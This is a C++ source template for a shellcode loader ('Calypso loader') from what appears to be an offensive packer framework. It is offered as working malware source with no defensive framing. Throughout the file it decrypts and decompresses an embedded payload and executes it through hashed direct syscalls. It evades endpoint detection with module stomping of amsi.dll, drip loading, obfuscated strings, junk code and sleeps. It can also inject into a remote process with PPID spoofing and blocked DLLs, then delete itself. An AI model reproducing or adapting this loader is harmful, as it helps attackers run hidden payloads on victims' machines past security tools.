// Calypso loader - Shellcode injection
// Based on NimSyscallPacker by @ShitSecure
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>

#include "obfuscate.hpp.in"
#include "syscalls.hpp.in"
#include "crypto_stub.hpp.in"
#include "common.hpp.in"
#include "evasion.hpp.in"

{{#IF EXEC_VM}}
#include "vm_ir.hpp.in"
{{#ENDIF}}
{{#IF EXEC_RISCVM}}
#include "vm_riscv.hpp.in"
{{#ENDIF}}

{{JUNK_CODE_BLOCKS}}

// Encrypted payload
{{ENCRYPTED_PAYLOAD}}

{{#IF ENTROPY_REDUCE}}
// Entropy reduction mask
{{ENTROPY_MASK}}
{{#ENDIF}}

// Encryption key
{{KEY_DATA}}

// Configuration
static constexpr size_t ORIGINAL_SIZE = {{ORIGINAL_SIZE}};

{{#IF ENCODE_NONE}}
// No encoding - payload is raw bytes
{{#ENDIF}}

{{#IF ENCODE_BASE64}}
static const char encoded_payload[] = "{{ENCODED_PAYLOAD}}";
{{#ENDIF}}
{{#IF ENCODE_HEX}}
static const char encoded_payload[] = "{{ENCODED_PAYLOAD}}";
{{#ENDIF}}
{{#IF ENCODE_MAC}}
static const char encoded_payload[] = "{{ENCODED_PAYLOAD}}";
{{#ENDIF}}
{{#IF ENCODE_UUID}}
static const char encoded_payload[] = "{{ENCODED_PAYLOAD}}";
{{#ENDIF}}

{{#IF EXEC_FIBER}}
using SwitchToFiber_t = void(WINAPI*)(LPVOID);
struct FiberCtx { LPVOID mainFiber; LPVOID shellcode; SwitchToFiber_t pSF; };
static FiberCtx g_fiber_ctx;
static VOID CALLBACK fiber_trampoline(LPVOID param) {
    auto* ctx = reinterpret_cast<FiberCtx*>(param);
    auto sc = reinterpret_cast<void(*)()>(ctx->shellcode);
    sc();
    ctx->pSF(ctx->mainFiber);
}
{{#ENDIF}}

{{#IF LOCAL_INJECT}}
static void execute_local() {
{{#IF ENTROPY_REDUCE}}
    for (size_t i = 0; i < payload_len; i++)
        payload[i] ^= entropy_mask[i];
{{#ENDIF}}

    // Decode if needed
    uint8_t* encrypted = nullptr;
    size_t encrypted_len = 0;

{{#IF ENCODE_NONE}}
    encrypted = payload;
    encrypted_len = payload_len;
{{#ENDIF}}
{{#IF ENCODE_BASE64}}
    uint8_t decode_buf[{{PAYLOAD_SIZE}} + 256];
    encrypted_len = decode_base64(encoded_payload, sizeof(encoded_payload) - 1, decode_buf);
    if (encrypted_len > {{PAYLOAD_SIZE}}) encrypted_len = {{PAYLOAD_SIZE}};
    encrypted = decode_buf;
{{#ENDIF}}
{{#IF ENCODE_HEX}}
    uint8_t decode_buf[{{PAYLOAD_SIZE}} + 256];
    encrypted_len = decode_hex(encoded_payload, sizeof(encoded_payload) - 1, decode_buf);
    if (encrypted_len > {{PAYLOAD_SIZE}}) encrypted_len = {{PAYLOAD_SIZE}};
    encrypted = decode_buf;
{{#ENDIF}}
{{#IF ENCODE_MAC}}
    uint8_t decode_buf[{{PAYLOAD_SIZE}} + 256];
    encrypted_len = decode_mac(encoded_payload, sizeof(encoded_payload) - 1, decode_buf);
    if (encrypted_len > {{PAYLOAD_SIZE}}) encrypted_len = {{PAYLOAD_SIZE}};
    encrypted = decode_buf;
{{#ENDIF}}
{{#IF ENCODE_UUID}}
    uint8_t decode_buf[{{PAYLOAD_SIZE}} + 256];
    encrypted_len = decode_uuid(encoded_payload, sizeof(encoded_payload) - 1, decode_buf);
    if (encrypted_len > {{PAYLOAD_SIZE}}) encrypted_len = {{PAYLOAD_SIZE}};
    encrypted = decode_buf;
{{#ENDIF}}

    // Decrypt
    uint8_t decrypted[{{PAYLOAD_SIZE}} + 256];
    size_t decrypted_len = sizeof(decrypted);
    if (!decrypt_payload(encrypted, encrypted_len, key, key_len, decrypted, &decrypted_len)) {
{{#IF VERBOSE}}
        // Decryption failed
{{#ENDIF}}
        return;
    }

    // Decompress
    uint8_t* shellcode = decrypted;
    size_t shellcode_len = decrypted_len;

{{#IF COMPRESS_ZLIB}}
    uint8_t decompressed[ORIGINAL_SIZE + 256];
    size_t decompressed_len = sizeof(decompressed);
    if (!decompress_zlib(decrypted, decrypted_len, decompressed, sizeof(decompressed), &decompressed_len))
        return;
    shellcode = decompressed;
    shellcode_len = decompressed_len;
{{#ENDIF}}
{{#IF COMPRESS_LZ4}}
    uint8_t decompressed[ORIGINAL_SIZE + 256];
    size_t decompressed_len = sizeof(decompressed);
    if (!decompress_lz4(decrypted, decrypted_len, decompressed, sizeof(decompressed), &decompressed_len))
        return;
    shellcode = decompressed;
    shellcode_len = decompressed_len;
{{#ENDIF}}
{{#IF COMPRESS_RLE}}
    uint8_t decompressed[ORIGINAL_SIZE + 256];
    size_t decompressed_len = sizeof(decompressed);
    if (!decompress_rle(decrypted, decrypted_len, decompressed, sizeof(decompressed), &decompressed_len))
        return;
    shellcode = decompressed;
    shellcode_len = decompressed_len;
{{#ENDIF}}
{{#IF COMPRESS_LZNT}}
    uint8_t decompressed[ORIGINAL_SIZE + 256];
    size_t decompressed_len = sizeof(decompressed);
    if (!decompress_lznt(decrypted, decrypted_len, decompressed, sizeof(decompressed), &decompressed_len))
        return;
    shellcode = decompressed;
    shellcode_len = decompressed_len;
{{#ENDIF}}

{{#IF SLEEP_IN_BETWEEN}}
    evasion_sleep({{SLEEP_IN_BETWEEN_SECONDS}});
{{#ENDIF}}

{{#IF EXEC_VM}}
    {
        uint8_t ir_blob[] = { {{VM_IR_BLOB}} };
        vm_ir_execute(shellcode, shellcode_len, ir_blob, sizeof(ir_blob), {{VM_IR_SEED}});
    }
    SecureZeroMemory(decrypted, sizeof(decrypted));
{{#IF COMPRESS_ZLIB}}
    SecureZeroMemory(decompressed, sizeof(decompressed));
{{#ENDIF}}
{{#IF COMPRESS_LZ4}}
    SecureZeroMemory(decompressed, sizeof(decompressed));
{{#ENDIF}}
{{#IF COMPRESS_RLE}}
    SecureZeroMemory(decompressed, sizeof(decompressed));
{{#ENDIF}}
{{#IF COMPRESS_LZNT}}
    SecureZeroMemory(decompressed, sizeof(decompressed));
{{#ENDIF}}
    return;
{{#ENDIF}}

{{#IF EXEC_RISCVM}}
    {
        uint8_t rv_code[] = { {{VM_RV_BLOB}} };
        vm_riscv_execute(shellcode, shellcode_len, rv_code, sizeof(rv_code),
                         {{VM_RV_SEED}}, {{VM_RV_XOR_KEY}});
    }
    SecureZeroMemory(decrypted, sizeof(decrypted));
{{#IF COMPRESS_ZLIB}}
    SecureZeroMemory(decompressed, sizeof(decompressed));
{{#ENDIF}}
{{#IF COMPRESS_LZ4}}
    SecureZeroMemory(decompressed, sizeof(decompressed));
{{#ENDIF}}
{{#IF COMPRESS_RLE}}
    SecureZeroMemory(decompressed, sizeof(decompressed));
{{#ENDIF}}
{{#IF COMPRESS_LZNT}}
    SecureZeroMemory(decompressed, sizeof(decompressed));
{{#ENDIF}}
    return;
{{#ENDIF}}

    HANDLE hProc = GetCurrentProcess();
    PVOID exec_addr = nullptr;
    auto NtPVM = get_syscall_fn<NtProtectVirtualMemory_t>(HASH_NtProtectVirtualMemory);
    if (!NtPVM) return;

{{#IF MODULE_STOMP}}
    // Module Stomping: load a sacrificial DLL, overwrite its .text section
    // Makes shellcode memory appear file-backed (evades unbacked-memory scanners)
    HMODULE hSacrifice = LoadLibraryW(obf_wide(L"amsi.dll"));
    if (!hSacrifice) hSacrifice = LoadLibraryW(obf_wide(L"dbghelp.dll"));
    if (!hSacrifice) return;

    auto s_dos = reinterpret_cast<PIMAGE_DOS_HEADER>(hSacrifice);
    auto s_nt = reinterpret_cast<PIMAGE_NT_HEADERS>(
        reinterpret_cast<BYTE*>(hSacrifice) + s_dos->e_lfanew);
    auto s_sec = IMAGE_FIRST_SECTION(s_nt);

    BYTE* stomp_addr = nullptr;
    SIZE_T stomp_size = 0;
    for (WORD si = 0; si < s_nt->FileHeader.NumberOfSections; si++) {
        if ((s_sec[si].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
            s_sec[si].Misc.VirtualSize >= shellcode_len) {
            stomp_addr = reinterpret_cast<BYTE*>(hSacrifice) + s_sec[si].VirtualAddress;
            stomp_size = s_sec[si].Misc.VirtualSize;
            break;
        }
    }
    if (!stomp_addr) return;

    {
        PVOID pa = stomp_addr;
        SIZE_T ps = stomp_size;
        ULONG op;
        NtPVM(hProc, &pa, &ps, PAGE_READWRITE, &op);

{{#IF DRIP_LOAD}}
        SIZE_T drip_size = 4096;
        for (SIZE_T offset = 0; offset < shellcode_len; offset += drip_size) {
            SIZE_T chunk = (shellcode_len - offset < drip_size) ? shellcode_len - offset : drip_size;
            memcpy(stomp_addr + offset, shellcode + offset, chunk);
            if (offset + drip_size < shellcode_len) {
                LARGE_INTEGER dw;
                dw.QuadPart = -10000LL * (50 + (offset % 100));
                auto NtDE = get_syscall_fn<NtDelayExecution_t>(HASH_NtDelayExecution);
                if (NtDE) NtDE(FALSE, &dw);
            }
        }
{{#ENDIF}}
{{#IF STANDARD_COPY}}
        memcpy(stomp_addr, shellcode, shellcode_len);
{{#ENDIF}}

        exec_addr = stomp_addr;
        pa = stomp_addr;
        ps = stomp_size;
        NtPVM(hProc, &pa, &ps, op, &op);
    }
{{#ENDIF}}

{{#IF STANDARD_ALLOC}}
    PVOID base_addr = nullptr;
    SIZE_T region_size = shellcode_len;

    auto NtAVM = get_syscall_fn<NtAllocateVirtualMemory_t>(HASH_NtAllocateVirtualMemory);
    if (!NtAVM) return;

    NTSTATUS status = NtAVM(hProc, &base_addr, 0, &region_size,
                            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (status != 0) return;

{{#IF DRIP_LOAD}}
    {
        SIZE_T drip_sz = 4096;
        for (SIZE_T off = 0; off < shellcode_len; off += drip_sz) {
            SIZE_T ch = (shellcode_len - off < drip_sz) ? shellcode_len - off : drip_sz;
            memcpy(reinterpret_cast<BYTE*>(base_addr) + off, shellcode + off, ch);
            if (off + drip_sz < shellcode_len) {
                LARGE_INTEGER dw;
                dw.QuadPart = -10000LL * (50 + (off % 100));
                auto NtDE = get_syscall_fn<NtDelayExecution_t>(HASH_NtDelayExecution);
                if (NtDE) NtDE(FALSE, &dw);
            }
        }
    }
{{#ENDIF}}
    exec_addr = base_addr;
{{#IF STANDARD_COPY}}
    memcpy(base_addr, shellcode, shellcode_len);
{{#ENDIF}}

    {
        ULONG old_prot;
        NtPVM(hProc, &base_addr, &region_size, PAGE_EXECUTE_READ, &old_prot);
    }
{{#ENDIF}}

{{#IF EXEC_DIRECT}}
    auto fn = reinterpret_cast<void(*)()>(exec_addr);
    fn();
{{#ENDIF}}

{{#IF EXEC_THREAD}}
    {
        HANDLE hThread = nullptr;
        auto NtCTE = get_syscall_fn<NtCreateThreadEx_t>(HASH_NtCreateThreadEx);
        if (!NtCTE) return;
        NtCTE(&hThread, THREAD_ALL_ACCESS, NULL, hProc, exec_addr,
              NULL, 0, 0, 0, 0, NULL);
        if (hThread) {
            auto NtWFSO = get_syscall_fn<NtWaitForSingleObject_t>(HASH_NtWaitForSingleObject);
            if (NtWFSO) NtWFSO(hThread, FALSE, NULL);
        }
    }
{{#ENDIF}}

{{#IF EXEC_APC}}
    {
        auto NtQAT = get_syscall_fn<NtQueueApcThread_t>(HASH_NtQueueApcThread);
        if (!NtQAT) return;
        NtQAT(GetCurrentThread(), exec_addr, NULL, NULL, NULL);
        SleepEx(INFINITE, TRUE);
    }
{{#ENDIF}}

{{#IF EXEC_CALLBACK}}
    EnumWindows(reinterpret_cast<WNDENUMPROC>(exec_addr), 0);
{{#ENDIF}}

{{#IF EXEC_FIBER}}
    {
        // CaroKann: fiber-based execution with trampoline
        using ConvertThreadToFiber_t = LPVOID(WINAPI*)(LPVOID);
        using CreateFiber_t = LPVOID(WINAPI*)(SIZE_T, LPFIBER_START_ROUTINE, LPVOID);
        using ConvertFiberToThread_t = BOOL(WINAPI*)();

        HMODULE hK32 = GetModuleHandleW(obf_wide(L"kernel32.dll"));
        auto pCTF = reinterpret_cast<ConvertThreadToFiber_t>(
            GetProcAddress(hK32, obf("ConvertThreadToFiber")));
        auto pCF = reinterpret_cast<CreateFiber_t>(
            GetProcAddress(hK32, obf("CreateFiber")));
        auto pSF = reinterpret_cast<SwitchToFiber_t>(
            GetProcAddress(hK32, obf("SwitchToFiber")));
        auto pCFT = reinterpret_cast<ConvertFiberToThread_t>(
            GetProcAddress(hK32, obf("ConvertFiberToThread")));
        if (!pCTF || !pCF || !pSF) return;

        LPVOID mainFiber = pCTF(NULL);
        if (!mainFiber) return;

        g_fiber_ctx.mainFiber = mainFiber;
        g_fiber_ctx.shellcode = exec_addr;
        g_fiber_ctx.pSF = pSF;

        LPVOID scFiber = pCF(0, fiber_trampoline, &g_fiber_ctx);
        if (!scFiber) { if (pCFT) pCFT(); return; }
        pSF(scFiber);
        // Don't DeleteFiber — shellcode threads may reference fiber stack data
        if (pCFT) pCFT();
    }
{{#ENDIF}}

    // Zero shellcode from stack
    SecureZeroMemory(decrypted, sizeof(decrypted));
{{#IF COMPRESS_ZLIB}}
    SecureZeroMemory(decompressed, sizeof(decompressed));
{{#ENDIF}}
{{#IF COMPRESS_LZ4}}
    SecureZeroMemory(decompressed, sizeof(decompressed));
{{#ENDIF}}
{{#IF COMPRESS_RLE}}
    SecureZeroMemory(decompressed, sizeof(decompressed));
{{#ENDIF}}
{{#IF COMPRESS_LZNT}}
    SecureZeroMemory(decompressed, sizeof(decompressed));
{{#ENDIF}}
}
{{#ENDIF}}

{{#IF REMOTE_INJECT}}
static void execute_remote() {
    // Find/create target process
    DWORD target_pid = 0;

    // Snapshot processes to find target
    using CreateToolhelp32Snapshot_t = HANDLE(WINAPI*)(DWORD, DWORD);
    using Process32FirstW_t = BOOL(WINAPI*)(HANDLE, LPPROCESSENTRY32W);
    using Process32NextW_t = BOOL(WINAPI*)(HANDLE, LPPROCESSENTRY32W);

    HMODULE hK32 = GetModuleHandleW(obf_wide(L"kernel32.dll"));
    auto pSnap = reinterpret_cast<CreateToolhelp32Snapshot_t>(
        GetProcAddress(hK32, obf("CreateToolhelp32Snapshot")));
    auto pFirst = reinterpret_cast<Process32FirstW_t>(
        GetProcAddress(hK32, obf("Process32FirstW")));
    auto pNext = reinterpret_cast<Process32NextW_t>(
        GetProcAddress(hK32, obf("Process32NextW")));

    if (!pSnap || !pFirst || !pNext) return;

    HANDLE hSnap = pSnap(0x2 /* TH32CS_SNAPPROCESS */, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return;

    PROCESSENTRY32W pe = {};
    pe.dwSize = sizeof(pe);
    if (pFirst(hSnap, &pe)) {
        do {
            // Compare with target process name
            const wchar_t* target = obf_wide(L"{{TARGET_PROCESS}}");
            if (lstrcmpiW(pe.szExeFile, target) == 0) {
                target_pid = pe.th32ProcessID;
                break;
            }
        } while (pNext(hSnap, &pe));
    }
    CloseHandle(hSnap);

    if (target_pid == 0) return;

{{#IF PPID_SPOOF}}
    // PPID spoofing - create suspended process with spoofed parent
    {
        DWORD parent_pid = 0;
        HANDLE hParentSnap = pSnap(0x2, 0);
        if (hParentSnap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32W ppe = {};
            ppe.dwSize = sizeof(ppe);
            if (pFirst(hParentSnap, &ppe)) {
                do {
                    const wchar_t* ppname = obf_wide(L"{{PPID_PROCESS}}");
                    if (lstrcmpiW(ppe.szExeFile, ppname) == 0) {
                        parent_pid = ppe.th32ProcessID;
                        break;
                    }
                } while (pNext(hParentSnap, &ppe));
            }
            CloseHandle(hParentSnap);
        }

        if (parent_pid != 0) {
            HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parent_pid);
            if (hParent) {
                DWORD attr_count = 1;
{{#IF BLOCK_DLLS}}
                attr_count = 2;
{{#ENDIF}}
                STARTUPINFOEXW si = {};
                PROCESS_INFORMATION pi = {};
                si.StartupInfo.cb = sizeof(si);
                SIZE_T attr_size = 0;
                InitializeProcThreadAttributeList(NULL, attr_count, 0, &attr_size);
                si.lpAttributeList = reinterpret_cast<LPPROC_THREAD_ATTRIBUTE_LIST>(
                    HeapAlloc(GetProcessHeap(), 0, attr_size));
                if (si.lpAttributeList) {
                    InitializeProcThreadAttributeList(si.lpAttributeList, attr_count, 0, &attr_size);
                    UpdateProcThreadAttribute(si.lpAttributeList, 0,
                        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                        &hParent, sizeof(hParent), NULL, NULL);

{{#IF BLOCK_DLLS}}
                    DWORD64 policy = 0x100000000000;
                    UpdateProcThreadAttribute(si.lpAttributeList, 0,
                        PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
                        &policy, sizeof(policy), NULL, NULL);
{{#ENDIF}}

                    wchar_t cmd[] = L"{{TARGET_PROCESS}}";
                    if (CreateProcessW(NULL, cmd, NULL, NULL, FALSE,
                            EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED,
                            NULL, NULL, &si.StartupInfo, &pi)) {
                        target_pid = pi.dwProcessId;
                    }
                    DeleteProcThreadAttributeList(si.lpAttributeList);
                    HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
                }
                CloseHandle(hParent);
            }
        }
    }
{{#ENDIF}}

    // Open target process via syscall
    HANDLE hTarget = nullptr;
    OBJECT_ATTRIBUTES oa = {};
    InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
    CLIENT_ID cid = {};
    cid.UniqueProcess = UlongToHandle(target_pid);

    using NtOpenProcess_t = NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK,
        POBJECT_ATTRIBUTES, PCLIENT_ID);
    auto NtOP = get_syscall_fn<NtOpenProcess_t>(HASH_NtOpenProcess);
    if (!NtOP) return;
    NtOP(&hTarget, PROCESS_ALL_ACCESS, &oa, &cid);
    if (!hTarget) return;

    // Decode + decrypt payload (same as local)
    uint8_t* encrypted = nullptr;
    size_t encrypted_len = 0;
{{#IF ENCODE_NONE}}
    encrypted = payload;
    encrypted_len = payload_len;
{{#ENDIF}}
    // (other encoding paths same as local)

    uint8_t decrypted[{{PAYLOAD_SIZE}} + 256];
    size_t decrypted_len = sizeof(decrypted);
    decrypt_payload(encrypted, encrypted_len, key, key_len, decrypted, &decrypted_len);

    uint8_t* shellcode = decrypted;
    size_t shellcode_len = decrypted_len;
    // (decompression same as local)

    // Remote allocation
    PVOID remote_addr = nullptr;
    SIZE_T remote_size = shellcode_len;

    auto NtAVM = get_syscall_fn<NtAllocateVirtualMemory_t>(HASH_NtAllocateVirtualMemory);
    NtAVM(hTarget, &remote_addr, 0, &remote_size,
          MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Write shellcode
    auto NtWVM = get_syscall_fn<NtWriteVirtualMemory_t>(HASH_NtWriteVirtualMemory);
    SIZE_T written = 0;
    NtWVM(hTarget, remote_addr, shellcode, shellcode_len, &written);

    // Change protection
    ULONG old_prot;
    auto NtPVM = get_syscall_fn<NtProtectVirtualMemory_t>(HASH_NtProtectVirtualMemory);
    NtPVM(hTarget, &remote_addr, &remote_size, PAGE_EXECUTE_READ, &old_prot);

    // Create remote thread
    HANDLE hThread = nullptr;
    auto NtCTE = get_syscall_fn<NtCreateThreadEx_t>(HASH_NtCreateThreadEx);
    NtCTE(&hThread, THREAD_ALL_ACCESS, NULL, hTarget, remote_addr,
          NULL, 0, 0, 0, 0, NULL);

    if (hThread) {
        auto NtWFSO = get_syscall_fn<NtWaitForSingleObject_t>(HASH_NtWaitForSingleObject);
        NtWFSO(hThread, FALSE, NULL);
        auto NtCl = get_syscall_fn<NtClose_t>(HASH_NtClose);
        NtCl(hThread);
    }
    auto NtCl = get_syscall_fn<NtClose_t>(HASH_NtClose);
    NtCl(hTarget);

    SecureZeroMemory(decrypted, sizeof(decrypted));
}
{{#ENDIF}}

{{#IF DLL_ENTRY}}
static bool g_initialized = false;

static void run_payload() {
    if (!g_initialized) {
        if (!init_syscalls()) return;
        if (!evasion_init()) return;
        g_initialized = true;
    }

{{#IF LOCAL_INJECT}}
    execute_local();
{{#ENDIF}}
{{#IF REMOTE_INJECT}}
    execute_remote();
{{#ENDIF}}

{{#IF SELF_DELETE}}
    self_delete();
{{#ENDIF}}

    // Keep alive for shellcode threads
    LARGE_INTEGER wait;
    wait.QuadPart = -10000LL * 60000;
    auto NtDE = get_syscall_fn<NtDelayExecution_t>(HASH_NtDelayExecution);
    for (;;) {
        if (NtDE) NtDE(FALSE, &wait);
        else Sleep(60000);
    }
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hinstDLL);
    }
    return TRUE;
}

{{DLL_EXPORTS}}
{{#ENDIF}}

{{#IF EXE_ENTRY}}
int main() {
    if (!init_syscalls()) return 1;
    if (!evasion_init()) return 1;

{{#IF LOCAL_INJECT}}
    execute_local();
{{#ENDIF}}
{{#IF REMOTE_INJECT}}
    execute_remote();
{{#ENDIF}}

{{#IF SELF_DELETE}}
    self_delete();
{{#ENDIF}}

    // Keep process alive for shellcode that spawns threads (staged payloads)
    LARGE_INTEGER wait;
    wait.QuadPart = -10000LL * 60000; // 60 seconds
    auto NtDE = get_syscall_fn<NtDelayExecution_t>(HASH_NtDelayExecution);
    for (;;) {
        if (NtDE) NtDE(FALSE, &wait);
        else Sleep(60000);
    }
}
{{#ENDIF}}
